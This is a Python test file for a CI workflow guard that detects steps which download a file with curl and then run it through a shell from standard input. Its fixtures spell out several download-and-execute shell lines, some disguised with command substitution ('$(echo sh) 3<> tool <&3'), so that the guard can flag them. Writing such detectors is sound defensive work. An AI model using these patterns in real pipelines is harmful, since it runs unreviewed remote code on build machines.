"""#3156: no reason the workflow guard prints names a marker of the reader's own.

The reader lifts a command substitution out of a word and leaves in its place a marker that only the parse that
minted it can read: `@@shell-<32 hex for the parse><16 hex for the process>-N@@` (`shell_tokens._Parse`), so that a
step cannot spell one (#2856, #3131, #3144). The #3140 round-2 seat found it in a reason: a substitution as the
command word that reads the fetched file on its standard input -- `$(echo sh) 3<> tool <&3`, std.tsv AV011, AV013
and AV015, and their `3<` twins -- was named as written by `workflow_uses.use`'s stdin branch. Every pass of the guard
mints its own nonce, so the job held the finding twice, and no two runs of the same row agreed: a kit dump compared
byte for byte showed movers that did not move. The reason names the substitution as `shell_reader.readable` renders it.
"""
import concurrent.futures
import json
import multiprocessing
import unittest

import workflow_guard as wg

GET = "curl -fsSLo tool https://example.test/tool\n"
SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
# std.tsv's own:AV011, own:AV013, own:AV015 and their owntw: twins, each the fetch, the row, then `echo done`.
ROWS = ("$(echo sh) 3<> tool <&3", "`echo sh` 3<> tool <&3", '"$(command -v sh)" 3<> tool <&3',
        "$(echo sh) 3< tool <&3", "`echo sh` 3< tool <&3", '"$(command -v sh)" 3< tool <&3')


def script(row):
    return GET + row + "\necho done\n"


class TestNoReasonNamesAReaderMarker(unittest.TestCase):

    def test_the_reason_names_the_substitution_once(self):
        # One finding, in every setting: the stdin runner as `readable` renders it, no marker, no twin from a pass
        # whose nonce differed.
        for row in ROWS:
            for shell in SHELLS:
                with self.subTest(row=row, shell=shell):
                    found = [why for _name, why in wg.job_defects([wg.Step("step", script(row), shell)])]
                    self.assertEqual(1, len(found))
                    self.assertNotIn("@@shell-", found[0])
                    self.assertIn("running it under `$(...)` from standard input", found[0])

    def test_a_shell_named_as_written_is_unchanged(self):
        # The control: a stdin runner the step names is named as before.
        for row in ("sh < tool", "/bin/sh < tool", "bash 3< tool <&3"):
            with self.subTest(row=row):
                found = [why for _name, why in wg.job_defects([wg.Step("step", script(row), None)])]
                self.assertEqual(1, len(found))
                self.assertIn("running it under `%s` from standard input" % row.split()[0].rsplit("/", 1)[-1], found[0])

    def test_two_processes_read_the_rows_alike(self):
        # The issue's reproducibility: each row read in two fresh interpreters gives the same findings, byte for byte.
        # `spawn`, never `fork`: a forked child would keep this process's `shell_tokens._OURS`.
        runs = []
        for _ in range(2):
            with concurrent.futures.ProcessPoolExecutor(1, mp_context=multiprocessing.get_context("spawn")) as pool:
                read = [pool.submit(wg.job_defects, [wg.Step("step", script(row), shell)])
                        for row in ROWS for shell in SHELLS]
                runs.append(json.dumps([[why for _name, why in job.result(timeout=300)] for job in read]))
        self.assertEqual(runs[0], runs[1])
        self.assertNotIn("@@shell-", runs[0])


if __name__ == "__main__":
    unittest.main()
